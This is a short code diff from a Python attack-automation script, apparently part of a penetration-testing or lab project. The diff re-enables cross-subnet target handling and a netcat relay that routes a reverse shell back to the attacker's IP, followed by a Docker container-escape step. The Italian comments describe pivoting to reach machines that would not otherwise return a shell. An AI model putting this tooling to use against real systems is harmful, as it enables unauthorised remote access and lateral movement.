@@ -43,8 +43,8 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     #save the ip
     for ip in target_list["targets"]:
         machines.append(ip["target"])
-        #if "other_subnet" in ip:
-            #other_subnet.update({ip["target"]:ip["other_subnet"]})
+        if "other_subnet" in ip:
+            other_subnet.update({ip["target"]:ip["other_subnet"]})
     #print(other_subnet)
 
     router=None
@@ -175,7 +175,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                         
-                        #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
+                        mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
